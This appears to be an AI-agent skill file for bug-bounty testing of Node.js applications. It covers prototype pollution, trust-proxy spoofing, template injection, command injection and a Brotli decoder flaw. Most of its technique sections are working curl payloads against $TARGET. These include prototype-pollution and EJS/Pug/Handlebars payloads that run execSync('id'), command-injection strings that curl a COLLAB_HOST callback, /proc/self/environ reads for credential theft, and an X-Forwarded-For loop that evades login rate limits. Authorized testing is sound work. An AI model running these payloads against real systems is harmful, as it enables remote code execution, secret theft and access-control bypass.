---
name: bbhunt-nodejs
description: "Hunt prototype pollution to RCE, trust-proxy abuse, eval/child_process injection and template-engine SSTI. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Node.js-specific vulnerability hunting — unified methodology

> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method
### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **CVE-2026-111497 "Node2Shell" / HTTP2Shell (Oct 2026)** — out-of-bounds write (CWE-787) plus unchecked return value (CWE-252) in the Brotli decoder bundled with Node.js. Google CVSS v4.0 **9.2**. Fixed runtimes: **22.23.4 / 24.22.1 / 26.12.1**; Node 20.x and 25.x are EoL with **no fix**. Upstream Brotli 1.0.3–1.2.0, fixed in 1.0.10 / 1.1.1 / 1.2.1; Bun ≤ 1.4.3 (fixed 1.4.4). Debian/Ubuntu/RHEL/Alpine may ship a *system* Brotli, so the Node.js `-v` number alone does not prove patched status — check the distro Brotli package.
- **Reachability fingerprints for Node2Shell** (the bug only matters where attacker-controlled bytes reach a decoder): **Express 5** + `express.json()` (body-parser 2.x, `inflate:true` by default) decodes `Content-Encoding: br` on any body-bearing route; **Express 4** body-parser 1.20.x rejects br with **415** through body-parser itself (other middleware may still decode); **server-side `fetch()`** decompresses any response with `Content-Encoding: br` even if you sent `Accept-Encoding: identity` (look for webhook/fetch features that take a user URL); direct `node:zlib` `createBrotliDecompress()`; **Koa** via `co-body` / `@koa/bodyparser` / `koa-body` / Egg / Strapi; **Fastify** with `@fastify/compress`.
- **lodash prototype-pollution cluster (2026):** **CVE-2026-2950** — `_.unset` / `_.omit` bypass the CVE-2025-13465 fix using **array-wrapped path segments**, allowing deletion of properties from `Object.prototype` / `Number.prototype` / `String.prototype`; fixed in **lodash 4.18.1** (and `lodash.unset` 4.18.0). **CVE-2026-4800** — `_.template` code injection; even pinned 4.17.21 sits inside multiple affected ranges. Pull `package.json` / `package-lock.json` / source maps and check the *resolved* version, not just the manifest.
- **Express `trust proxy` misconfiguration** — `app.set('trust proxy', true)` makes `req.ip` fully attacker-controlled via `X-Forwarded-For`; correct forms are a hop count (`1`, `2`) or an explicit proxy CIDR/IP. Probe admin/rate-limit endpoints with `X-Forwarded-For: 127.0.0.1`, `10.0.0.1`, and rotating `1.2.3.$i`, plus `X-Real-IP`, `X-Forwarded-Proto`, `X-Forwarded-Port`.
- **CVE-2026-56848** — Node.js HTTP/2 use-after-free affecting 26.x/24.x/22.x lines; include alongside HTTP/2-focused DoS probes.
- **OpenJS CNA advisory:** a per-host mTLS authorization bypass where a CA-only SNI context fails open to the default CA — relevant when the Node service terminates mutual TLS itself.
- **Classic signals still valid:** `X-Powered-By: Express`, `.js` stack paths, `package.json` / `package-lock.json` / `node_modules/.package-lock.json` exposure, `__proto__` accepted in JSON, `/proc/self/environ` readable via any LFI.
- **Fingerprinting the exact decompressor from the outside:** send `Content-Encoding: br` with an invalid Brotli body to a JSON endpoint and compare responses. A **415** means body-parser rejected the encoding before decompression; a **400 with a zlib/Brotli error message** means a decoder was reached; a **timeout, 500, or empty connection reset** on a small crafted body is the suspicious Node2Shell signal. Repeat on GET/POST body-bearing routes and on webhook-receiver paths.
- **`express-rate-limit` context:** version 8.3.1 (as of mid-2026) is the current Express limiter; a missing `trust proxy` configuration makes every client share one bucket (first client to hit the limit trips it for everyone), while `trust proxy: true` lets anyone escape their bucket. Both misconfigurations are testable on `/api/login` with a small request burst.
- **Node runtime inventory signals in JS bundles:** `__NEXT_DATA__` / webpack chunks may embed `process.version`, `process.versions.openssl`, or a hardcoded `NODE_OPTIONS`. Any `NODE_OPTIONS=--require`/`--inspect` string in a bundled config or `.env` is a separate high-severity finding.
- **HTTP/2 surface:** confirm ALPN `h2` with `openssl s_client -alpn h2 -connect host:443`; HTTP/2 Rapid Reset (CVE-2023-44487) and Node's 2026 HTTP/2 UAF (CVE-2026-56848) both require the protocol to be negotiated. Test on the API host, not just the marketing host.
- **Dependency version pinning:** `npm ls lodash body-parser express` (where source is available) or a source-map reconstruction should be recorded for every claim — the 2026 lodash advisories hinge on the exact resolved version (4.17.23 introduced one fix, 4.18.1 fixes the bypass).
- **Suspicious runtime response shapes:** a body-parser 2.x stack mentioning `zlib` / `BrotliDecompress`, a `Received HTTP/2 stream error` log, or repeated worker restarts correlated with br-encoded requests are telemetry-grade indicators of Node2Shell probing even when your own PoC only produced a crash.### Signals and surfaces
### Crown Jewel Targets

Prototype Pollution reaching a sink in Node.js backend = Critical RCE.

**Highest-value chains:**
- **Prototype Pollution → RCE** — `__proto__` injection via `lodash.merge` / `Object.assign` → polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink
- **Express trust proxy** — `app.set('trust proxy', true)` without validation → attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits
- **EJS/Pug SSTI** — template engine receives user input → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — user input interpolated into shell command string → OS command injection
- **`require()` path traversal** — attacker-controlled module path → load arbitrary file as JS

---

### Attack Surface Signals

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---### Techniques and bypasses
### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Node2Shell probe shape:** send a POST with `Content-Encoding: br` and a hand-crafted Brotli stream whose meta-block declares one block type then requests a block-type switch. Patched builds fail immediately with `BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH` (the new error constant from upstream commit `0ed4268a`); unpatched builds either crash or continue into the OOB write. Use a **unique per-test subdomain** on a Collaborator for the callback — crashes are easy to reproduce, confirmed code execution is not.
- **Outbound variant:** if the app fetches attacker-controlled URLs (webhooks, link previews, URL import), host a Brotli-encoded response with `Content-Encoding: br`; Node's `fetch()` decompresses it regardless of the request's `Accept-Encoding`. Audit every `fetch()`/`http.get()` to an untrusted host.
- **Temporary mitigation to test the boundary:** `express.json({ inflate: false })` makes body-parser 415 compressed bodies (also rejects gzip). Rejecting `Content-Encoding: br` at the proxy is a layer, not a fix, and does not cover fetched responses.
- **Prototype-pollution → RCE sinks (refresh of the baseline):** array-wrapped paths for the lodash 2026 bypass (`{"__proto__": ...}` is less useful than `_.unset(obj, ["__proto__", "x"])`-shaped input); then chase sinks — `child_process` options pollution (`shell`, `NODE_OPTIONS="--require /proc/self/fd/0"`), `lodash.template` `sourceURL` injection, EJS `outputFunctionName` pollution, or `NODE_OPTIONS="--inspect=COLLAB"` for an inspector-port RCE. Confirm pollution with a subsequent request that reflects the injected key without it being sent.
- **Express trust-proxy abuse:** a spoofed `X-Forwarded-For: 127.0.0.1` on `/api/admin/*` tests IP allowlists; rotating the last octet across 50 login attempts tests per-IP rate limits. A `true` setting is the root cause; a hop-count setting still lets you control the *untrusted* leftmost entry if the app reads the whole header instead of `req.ip`.
- **Template engines:** EJS `<%= 7*7 %>` → 49, then `process.mainModule.require("child_process").execSync("id")`; Pug `- var x = root.process` then `x.mainModule.require(...)`; Handlebars prototype-pollution gadget via nested `#with`/`#each`. SSTI → OOB callback remains the cleanest proof.
- **`require()` injection:** where a module path is user-controlled, `require("../package.json")`, `require("/proc/self/environ")`, or a `data:`/`node:` prefixed path can load server-local files as JS. Combine with a relative path traversal to reach `../../config/production.json` and dump secrets in the thrown stack trace.
- **Body-parser depth:** JSON and `urlencoded` parsers have a `depth` option (default 32 in newer body-parser); deeply nested JSON can be used for parser-exhaustion DoS, and `__proto__` inside nested structures is the classic lodash/qs pollution carrier. Test both `{"a":{"b":...}}` nesting and `?a[b][__proto__][x]=1` query forms.
- **Stack-trace oracle:** Node unhandled exceptions print absolute `.js` paths and module versions. Trigger one deliberately with a type-confusion input (`{"id": {"toString": 1}}`) and use the disclosed `node_modules/<pkg>/package.json` paths to pin exact dependency versions for CVE matching.### Validation and proof
### Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Node2Shell evidence quality matters.** Public research has repeatedly produced **crashes** but only one well-documented remote code-execution reproduction (Imperva on the official Node 24.22.0 arm64 image, needing several attempts); some analyses argue the reachable impact is DoS. Report "Brotli decoder memory corruption / process crash on unpatched Node.js" with confidence; claim RCE only with an OOB callback or command output. Note openly that cross-platform reliable RCE was not publicly demonstrated at publication time.
- **Version matching is a lead, not proof.** A vulnerable Node.js version only matters if the specific code path decodes attacker-controlled Brotli — Express 4 with only body-parser 1.20.x and no other decompressor is not reachable through that middleware. Document the exact reachable route/middleware or fetch call.
- **Separate the two lodash CVEs:** CVE-2026-2950 permits **deleting** prototype properties (stability/DoS and chain-enabling), not arbitrary overwriting. Do not describe it as "full prototype pollution → RCE" without demonstrating a downstream sink. Check the *fixed* version (4.18.1) against `package-lock.json`, not just `package.json`.
- **`trust proxy` false positive:** a rotated `X-Forwarded-For` that changes nothing means either `trust proxy` is off or the app uses a different header/store. Confirm by checking whether the server logs/reflects `req.ip` as your spoofed value before claiming a rate-limit bypass.
- **Blind primitives need OOB.** Prototype-pollution-to-RCE, SSTI, and command injection must produce a unique Collaborator DNS/HTTP hit or literal `id` output. A delayed response or a changed error string is not execution.
- **Redact** any leaked `AWS_ACCESS_KEY_ID`, tokens from `/proc/self/environ`, and session cookies in PoCs; a runtime environment dump is High/Critical only if you show a usable credential, not merely the presence of env vars.
- **Node2Shell patch verification:** require `node --version` **inside the running container** (floating tags like `node:24` can stay stale when images are rebuilt from cache) and the distro Brotli package version. A patched Node.js binary linked against an unfixed system Brotli is still vulnerable — check both layers before reporting or closing a finding.
- **DoS-vs-RCE reporting bar for Node2Shell:** the realistic baseline is process crash (availability impact) across any service decoding untrusted Brotli; the credible worst case is code execution with the Node.js process's privileges and memory disclosure of in-process secrets. State which of the three you actually observed and cite the reproduction constraints rather than the CVE's headline CVSS.
- **Reproducibility:** include the compressed body as a hex/base64 blob or a generator script (not a screenshot), the exact `Content-Encoding`/`Content-Type` headers, the route, the Node version, and the Collaborator subdomain or crash log. A triager must be able to replay without reconstructing your Brotli stream by hand.

**Cross-skill chaining note:** Node2Shell reachability often arrives through another finding — an SSRF that makes the server `fetch()` an attacker URL, an open webhook configuration, or a file-upload endpoint that stores a `.js` module later `require()`d. Chain the primitive in the report (`ssrf` → `fetch()` with `Content-Encoding: br` → Brotli decoder) rather than listing them as separate Low findings.

### Validation

✅ Prototype pollution: key appears in subsequent API responses without being sent
✅ RCE chain: OOB callback received OR `id` output in response
✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist

**Severity:**
- Prototype pollution → RCE: Critical
- SSTI → RCE: Critical
- child_process injection: Critical
- Trust proxy → rate limit bypass: Medium
- /proc/self/environ exfil: High (if cloud keys present)### Escalation and related chains
### Phase 3 — Prototype Pollution → RCE Chain

```bash
# If pollution is confirmed, attempt to reach dangerous sinks

# Sink 1: child_process via options.shell pollution
curl -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

# Sink 2: lodash template pollution (CVE-2021-23337)
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

# Sink 3: ejs template options pollution
# If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

# OOB confirmation — check Interactsh for callback
```

---

### Chain Table

| Node.js finding | Chain to | Impact |
|----------------|----------|--------|
| Prototype pollution confirmed | Find RCE sink (child_process, eval) | Critical RCE |
| Express trust proxy | Bypass IP allowlist / rate limit | Auth bypass / DoS bypass |
| SSTI in template engine | OS command execution | Critical RCE |
| child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
| /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |

---### Sources and related reading
### D. Sources — numbered list of URLs you actually fetched

1. https://www.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
2. https://nvd.nist.gov/vuln/detail/CVE-2026-2950
3. https://security.snyk.io/vuln/SNYK-JS-LODASHES-15869621
4. https://expressjs.com/en/advanced/best-practice-security/
5. https://cna.openjsf.org/security-advisories.html
6. https://www.cve.org/CVERecord?id=CVE-2026-2950
7. https://www.sysdig.com/blog/introducing-sysdig-ai-defense
8. https://semgrep.dev/blog/2026/patch-your-node-and-eat-your-brotli-or-you-wont-get-dessert/
9. https://www.imperva.com/blog/node2shell-from-brotli-data-to-remote-code-execution/
10. https://nodejs.org/en/blog/release/v24.22.1
11. https://github.com/advisories/GHSA-fwxx-wv44-7qfg### Additional notes
### Phase 1 — Fingerprint

```bash
# Confirm Node.js/Express
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

# Check for package.json / node_modules exposure
curl -s "https://$TARGET/package.json"
curl -s "https://$TARGET/package-lock.json"
curl -s "https://$TARGET/node_modules/.package-lock.json"

# Error-based version detection
curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

### Phase 2 — Prototype Pollution Detection

```bash
# JSON body injection — test if __proto__ is accepted
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Constructor prototype
curl -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# URL query param injection (qs library)
curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

# Confirm pollution: does a subsequent request reflect the polluted key?
curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

### Phase 4 — Express Trust Proxy Abuse

```bash
# If Express has trust proxy enabled, X-Forwarded-For is trusted
# Test: does spoofed IP bypass IP-based rate limiting or allowlist?

# Spoof IP to 127.0.0.1 (localhost bypass)
curl -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

# Spoof to internal IP range
curl -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

### Phase 5 — Template Engine SSTI (EJS / Pug / Handlebars)

```bash
# EJS SSTI — if user input reaches EJS template context
# Test basic: <%= 7*7 %> should return 49
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

# EJS RCE payload
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

# Pug SSTI
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

# Handlebars — prototype pollution via template
curl -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

### Phase 6 — child_process Command Injection

```bash
# Look for endpoints that run shell commands with user input
# Signals: /api/convert, /api/exec, /api/ping, /api/scan

# Basic injection test
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

# OOB via DNS
curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

### Phase 7 — /proc/self/environ Exfil

```bash
# If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl -s "https://$TARGET/api/file?path=/proc/self/environ"
curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

# Also check:
curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---## Probes

## Supporting data

- `bbhunt-methodology` — orchestrator, state machine and class router
